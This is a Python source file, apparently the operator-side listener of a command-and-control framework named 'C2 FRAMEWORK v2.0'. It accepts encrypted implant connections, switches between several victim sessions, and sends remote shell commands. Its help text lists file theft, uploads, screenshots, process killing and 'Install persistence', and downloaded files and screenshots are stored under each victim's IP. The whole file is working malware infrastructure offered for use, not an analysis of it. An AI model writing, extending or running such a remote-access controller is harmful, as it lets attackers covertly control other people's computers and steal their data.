#!/usr/bin/env python3
import socket
import threading
import os
import sys
import json
import base64
import shutil
import time
from datetime import datetime
from collections import OrderedDict

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import cybc2

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, 'data')
PSK_FILE = os.path.join(DATA_DIR, 'psk.json')


def load_psk():
    """Read the panel PSK written by web_listener.py, or make one."""
    os.makedirs(DATA_DIR, exist_ok=True)
    try:
        with open(PSK_FILE) as f:
            return cybc2.load_psk(json.load(f)['psk'])
    except Exception:
        key = os.urandom(32)
        try:
            with open(PSK_FILE, 'w') as f:
                json.dump({'psk': key.hex(),
                           'created': datetime.now().isoformat()}, f, indent=2)
            os.chmod(PSK_FILE, 0o600)
        except Exception:
            pass
        return key

# ANSI cyberpunk colors
C = '\033[36m'   # cyan
M = '\033[35m'   # magenta
G = '\033[92m'   # green
Y = '\033[93m'   # yellow
R = '\033[91m'   # red
D = '\033[90m'   # dim
B = '\033[1m'    # bold
N = '\033[0m'    # reset
BG = '\033[40m'  # black background
UL = '\033[4m'   # underline

BANNER = f'''
{B}{C}  ██████╗██╗   ██╗██████╗ ███████╗██████╗ ██████╗ ███████╗███╗   ███╗ ██████╗ ███╗   ██╗███████╗{N}
{C} ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝████╗ ████║██╔═══██╗████╗  ██║██╔════╝{N}
{C} ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝██║  ██║█████╗  ██╔████╔██║██║   ██║██╔██╗ ██║███████╗{N}
{C} ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║██║╚██╗██║╚════██║{N}
{C} ╚██████╗   ██║   ██████╔╝███████╗██║  ██║██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝██║ ╚████║███████║{N}
{C}  ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝{N}
{B}{M}                         C2 FRAMEWORK v2.0 — LISTENER MODULE{N}
'''

# Session manager for multiple clients
class SessionManager:
    def __init__(self):
        self.sessions = OrderedDict()
        self.active_session = None
        self.lock = threading.Lock()
        self.session_counter = 0
        self.current_input = None
        
    def add_session(self, conn, addr, sess=None):
        with self.lock:
            self.session_counter += 1
            session_id = self.session_counter
            self.sessions[session_id] = {
                'id': session_id,
                'conn': conn,
                'sess': sess,
                'addr': addr,
                'connected': True,
                'history': [],
                'output_buffer': [],
                'created': datetime.now().strftime('%H:%M:%S')
            }
            if self.active_session is None:
                self.active_session = session_id
            return session_id
    
    def remove_session(self, session_id):
        with self.lock:
            if session_id in self.sessions:
                self.sessions[session_id]['connected'] = False
                if self.active_session == session_id:
                    self.active_session = self.get_next_session()
    
    def get_session(self, session_id):
        with self.lock:
            return self.sessions.get(session_id)
    
    def get_active_session(self):
        with self.lock:
            if self.active_session and self.active_session in self.sessions:
                return self.sessions[self.active_session]
            return None
    
    def set_active(self, session_id):
        with self.lock:
            if session_id in self.sessions and self.sessions[session_id]['connected']:
                self.active_session = session_id
                return True
            return False
    
    def get_next_session(self):
        with self.lock:
            connected = [sid for sid, s in self.sessions.items() if s['connected']]
            if not connected:
                return None
            if self.active_session in connected:
                idx = connected.index(self.active_session)
                return connected[(idx + 1) % len(connected)]
            return connected[0] if connected else None
    
    def get_prev_session(self):
        with self.lock:
            connected = [sid for sid, s in self.sessions.items() if s['connected']]
            if not connected:
                return None
            if self.active_session in connected:
                idx = connected.index(self.active_session)
                return connected[(idx - 1) % len(connected)]
            return connected[-1] if connected else None
    
    def get_all_sessions(self):
        with self.lock:
            return dict(self.sessions)
    
    def get_connected_count(self):
        with self.lock:
            return sum(1 for s in self.sessions.values() if s['connected'])
    
    def add_output(self, session_id, data):
        with self.lock:
            if session_id in self.sessions:
                self.sessions[session_id]['output_buffer'].append(data)
    
    def get_output(self, session_id):
        with self.lock:
            if session_id in self.sessions:
                output = self.sessions[session_id]['output_buffer']
                self.sessions[session_id]['output_buffer'] = []
                return output
            return []

session_mgr = SessionManager()

def get_client_dirs(addr):
    ip = addr[0]
    base = os.path.join(BASE_DIR, 'clients', ip)
    dirs = {
        'downloads': os.path.join(base, 'downloads'),
        'screenshots': os.path.join(base, 'screenshots'),
        'uploads': os.path.join(base, 'uploads'),
    }
    for d in dirs.values():
        os.makedirs(d, exist_ok=True)
    return dirs

def save_file_to(path, data, folder):
    fname = f"{datetime.now().strftime('%H%M%S')}_{os.path.basename(path)}"
    fpath = os.path.join(folder, fname)
    with open(fpath, 'wb') as f:
        f.write(data)
    return fpath

def print_status_bar():
    """Print the status bar showing all sessions"""
    sessions = session_mgr.get_all_sessions()
    if not sessions:
        return
    
    active = session_mgr.get_active_session()
    connected = session_mgr.get_connected_count()
    
    print(f"\n{BG}{C}{'═'*60}{N}")
    print(f"{BG}{M} SESSIONS [{connected} online]{N}")
    for sid, s in sessions.items():
        status = f"{G}●{N}" if s['connected'] else f"{R}○{N}"
        active_marker = f" {UL}ACTIVE{N}" if active and sid == active['id'] else ""
        print(f"{BG}  {status} [{sid}] {s['addr']}{active_marker}")
    print(f"{BG}{C}{'═'*60}{N}")
    print(f"{D}  Tab/Shift-Tab: switch | !sessions: list | !switch <id>: select{N}")
    print(f"{D}  Type commands for active session{N}\n")

def print_prompt():
    active = session_mgr.get_active_session()
    if active:
        return f"{G}[{active['id']}]{N}{C}@{active['addr'].split(':')[0]}{N}> "
    return f"{C}CMD{N}> "

def handle_client(conn, addr, psk):
    """CYB3 session: PSK-authenticated X25519 then ChaCha20-Poly1305 frames."""
    dirs = get_client_dirs(addr)

    try:
        sess, cli_pub, _ = cybc2.server_handshake(conn, psk)
    except Exception as e:
        print(f"\n{R}[-] handshake failed for {addr[0]}:{addr[1]}: {e}{N}")
        try:
            conn.close()
        except Exception:
            pass
        return

    session_id = session_mgr.add_session(conn, addr, sess)

    print(f"\n{M}[+] Connection from {addr[0]}:{addr[1]} (Session {session_id}, CYB3){N}")
    print_status_bar()

    try:
        while True:
            session = session_mgr.get_session(session_id)
            if not session or not session['connected']:
                break

            try:
                cmd = get_input_with_keys()
            except (EOFError, KeyboardInterrupt):
                print(f"\n{R}[-] Session {session_id} interrupted{N}")
                break

            if not cmd.strip():
                continue

            # ---- operator-side commands (never sent to the implant) ----
            low = cmd.lower()
            if low in ("clear", "cls"):
                os.system("cls" if os.name == "nt" else "clear")
                continue
            if low in ("!sessions", "sessions"):
                print_status_bar()
                continue
            if low.startswith("!switch ") or low.startswith("switch "):
                parts = cmd.split()
                if len(parts) >= 2:
                    try:
                        target = int(parts[1])
                        if session_mgr.set_active(target):
                            print(f"{G}[+] Switched to session {target}{N}")
                            print_status_bar()
                        else:
                            print(f"{R}[-] Session {target} not found or disconnected{N}")
                    except ValueError:
                        print(f"{R}[-] Invalid session ID{N}")
                continue
            if low in ("!next", "next"):
                nid = session_mgr.get_next_session()
                if nid:
                    session_mgr.set_active(nid)
                    print(f"{G}[+] Switched to session {nid}{N}")
                    print_status_bar()
                else:
                    print(f"{R}[-] No other sessions{N}")
                continue
            if low in ("!prev", "prev"):
                pid_ = session_mgr.get_prev_session()
                if pid_:
                    session_mgr.set_active(pid_)
                    print(f"{G}[+] Switched to session {pid_}{N}")
                    print_status_bar()
                else:
                    print(f"{R}[-] No other sessions{N}")
                continue
            if low == "history":
                if not session['history']:
                    print(f"    {D}No commands sent yet{N}")
                else:
                    print(f"    {Y}Command history ({len(session['history'])}):{N}")
                    for i, h in enumerate(session['history'], 1):
                        print(f"    {D}{i:3d}. [{h['time']}]{N} {C}{h['cmd']}{N}")
                continue
            if low == "help":
                print(f"""
{G}Session Commands:{N}
  {C}!sessions{N}           List all sessions
  {C}!switch <id>{N}        Switch to session by ID
  {C}!next{N} / {C}!prev{N}         Cycle sessions
  {C}!whoami{N}            Show the active session

{G}Implant Commands:{N}
  {C}!shell <cmd>{N}       Execute a shell command (or just type the command)
  {C}!cd <dir>{N}          Change directory on target
  {C}!pwd{N}               Print working directory
  {C}!ls <path>{N}         List directory contents
  {C}!download <path>{N}   Download a file from target
  {C}!upload <path>{N}     Upload a local file to target
  {C}!ps{N}                List processes
  {C}!kill <pid>{N}        Kill a process
  {C}!screenshot{N}        Take a screenshot
  {C}!sysinfo{N}           Get system information
  {C}!persist{N}           Install persistence
  {C}!exit{N}              Disconnect target

{G}Global Commands:{N}
  {Y}history{N}            Command history for the current session
  {Y}clear/cls{N}          Clear terminal
  {Y}help{N}               This help
  {Y}quit{N}               Leave the listener

{D}Transport: CYB3 -- X25519 + ChaCha20-Poly1305, PSK authenticated.
Anything without a '!' prefix runs through the target's shell.
                """)
                continue

            session['history'].append({'cmd': cmd,
                                       'time': datetime.now().strftime('%H:%M:%S')})

            # ---- upload: inline the file, then send one frame ----
            if cmd.startswith("!upload "):
                parts = cmd[8:].strip().split(None, 1)
                if not parts:
                    print(f"    {Y}[!] Usage: !upload <local_path> [remote_path]{N}")
                    continue
                local_path = parts[0]
                remote_path = parts[1] if len(parts) > 1 else os.path.basename(local_path)
                if not os.path.isfile(local_path):
                    print(f"    {R}[-] Local file not found: {local_path}{N}")
                    continue
                size = os.path.getsize(local_path)
                if size > 10 * 1024 * 1024:
                    print(f"    {R}[-] File exceeds the 10MB limit{N}")
                    continue
                with open(local_path, "rb") as f:
                    file_data = f.read()
                print(f"    {G}[+] Uploading {local_path} ({size} bytes) -> {remote_path}{N}")
                cmd = f"!upload {remote_path}|" + base64.b64encode(file_data).decode()
                try:
                    shutil.copy2(local_path,
                                 os.path.join(dirs['uploads'], os.path.basename(local_path)))
                except Exception:
                    pass

            # ---- send ----
            try:
                sess.send(conn, cybc2.T_CMD, cmd.encode())
            except Exception as e:
                print(f"{R}[-] Session {session_id}: send failed ({e}){N}")
                session_mgr.remove_session(session_id)
                break

            if cmd.lower() == "exit":
                session_mgr.remove_session(session_id)
                break

            # ---- receive ----
            conn.settimeout(60)
            result = None
            try:
                while result is None:
                    chunk = conn.recv(65536)
                    if not chunk:
                        break
                    sess.feed(chunk)
                    while True:
                        msg = sess.recv()
                        if msg is None:
                            break
                        ftype, pt = msg
                        if ftype == cybc2.T_PING:
                            sess.send(conn, cybc2.T_PONG, pt)
                            continue
                        if ftype == cybc2.T_PONG:
                            continue
                        if ftype in (cybc2.T_BYE, cybc2.T_ERR):
                            result = "__disconnect__"
                            break
                        if ftype == cybc2.T_RESP:
                            result = pt.decode('utf-8', 'replace')
                            break
            except socket.timeout:
                result = "<timeout: no response within 60s>"
            except ValueError as e:
                result = f"<protocol error: {e}>"
            except OSError:
                result = None

            if result is None:
                print(f"{R}[-] Session {session_id}: connection lost{N}")
                session_mgr.remove_session(session_id)
                break
            if result == "__disconnect__":
                print(f"{Y}[*] Session {session_id} closed by the implant{N}")
                session_mgr.remove_session(session_id)
                break

            emit_result(result, dirs)

    except Exception as e:
        print(f"{R}[-] Error: {e}{N}")
    finally:
        session_mgr.remove_session(session_id)
        try:
            conn.close()
        except Exception:
            pass


def emit_result(result, dirs):
    """Print a response, unpacking file payloads to disk."""
    if result.startswith("[DOWNLOAD]"):
        rest = result[10:]
        sep_idx = rest.find('|')
        if sep_idx != -1:
            fpath = rest[:sep_idx]
            b64_data = rest[sep_idx + 1:]
            try:
                data = base64.b64decode(b64_data)
                save_file_to(fpath, data, dirs['downloads'])
                print(f"    {G}[+] Downloaded {len(data)} bytes from {fpath}{N}")
                return
            except Exception as e:
                print(f"    {R}[-] Download decode error: {e}{N}")
                return
    elif result.startswith("[SCREENSHOT]"):
        rest = result[12:]
        sep_idx = rest.find('|')
        if sep_idx != -1:
            dims = rest[:sep_idx]
            b64_data = rest[sep_idx + 1:]
            try:
                data = base64.b64decode(b64_data)
                save_file_to(f"screenshot_{dims}.bmp", data, dirs['screenshots'])
                print(f"    {G}[+] Screenshot saved ({dims}, {len(data)} bytes){N}")
                return
            except Exception as e:
                print(f"    {R}[-] Screenshot decode error: {e}{N}")
                return
    print(result)


def setup_tab_completion():
    """Setup tab completion for session switching"""
    try:
        import readline
        import rlcompleter
        
        def complete(text, state):
            commands = ['!sessions', '!switch', '!next', '!prev', 'help', 'history', 'clear', 'cls', 'exit']
            sessions = [f"!switch {sid}" for sid in session_mgr.get_all_sessions().keys()]
            all_commands = commands + sessions
            
            if state == 0:
                complete.matches = [c for c in all_commands if c.startswith(text)]
            return complete.matches[state] if state < len(complete.matches) else None
        
        readline.set_completer(complete)
        readline.parse_and_bind('tab: complete')
    except ImportError:
        pass

setup_tab_completion()

def get_input_with_keys():
    """Get input with support for Tab and Shift-Tab session switching"""
    try:
        import tty
        import termios
        
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        
        try:
            tty.setraw(fd)
            prompt = print_prompt()
            sys.stdout.write(prompt)
            sys.stdout.flush()
            
            chars = []
            while True:
                ch = sys.stdin.read(1)
                
                if ch == '\x03':  # Ctrl+C
                    raise KeyboardInterrupt
                elif ch == '\x04':  # Ctrl+D
                    raise EOFError
                elif ch == '\x0a' or ch == '\x0d':  # Enter
                    sys.stdout.write('\n')
                    sys.stdout.flush()
                    return ''.join(chars)
                elif ch == '\x7f' or ch == '\x08':  # Backspace
                    if chars:
                        chars.pop()
                        sys.stdout.write('\b \b')
                        sys.stdout.flush()
                elif ch == '\t':  # Tab - next session
                    next_id = session_mgr.get_next_session()
                    if next_id:
                        session_mgr.set_active(next_id)
                        # Clear current line and show new prompt
                        sys.stdout.write(f'\r\033[K')
                        new_prompt = print_prompt()
                        sys.stdout.write(new_prompt + ''.join(chars))
                        sys.stdout.flush()
                elif ch == '\x1b':  # Escape sequence
                    next_ch = sys.stdin.read(1)
                    if next_ch == '[':
                        seq_ch = sys.stdin.read(1)
                        if seq_ch == 'Z':  # Shift-Tab - prev session
                            prev_id = session_mgr.get_prev_session()
                            if prev_id:
                                session_mgr.set_active(prev_id)
                                sys.stdout.write(f'\r\033[K')
                                new_prompt = print_prompt()
                                sys.stdout.write(new_prompt + ''.join(chars))
                                sys.stdout.flush()
                        elif seq_ch == 'A':  # Up arrow - history
                            pass
                        elif seq_ch == 'B':  # Down arrow
                            pass
                else:
                    if ch.isprintable():
                        chars.append(ch)
                        sys.stdout.write(ch)
                        sys.stdout.flush()
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
    except (ImportError, termios.error):
        # Fallback to standard input
        return input(print_prompt())

def start_server(host='0.0.0.0', port=7777):
    psk = load_psk()
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)
    print(f"{G}[+] Listening on {host}:{port}{N}")
    print(f"{D}    Protocol: CYB3  X25519 + ChaCha20-Poly1305  (PSK authenticated){N}")
    print(f"{D}    PSK: {psk.hex()[:16]}...{N}")
    print(f"{D}    Type 'help' for commands; Tab/Shift-Tab switches sessions{N}\n")

    try:
        while True:
            conn, addr = server.accept()
            t = threading.Thread(target=handle_client, args=(conn, addr, psk))
            t.daemon = True
            t.start()
    except KeyboardInterrupt:
        print(f"\n{R}[-] Shutting down...{N}")
    finally:
        server.close()

if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 7777
    start_server(port=port)
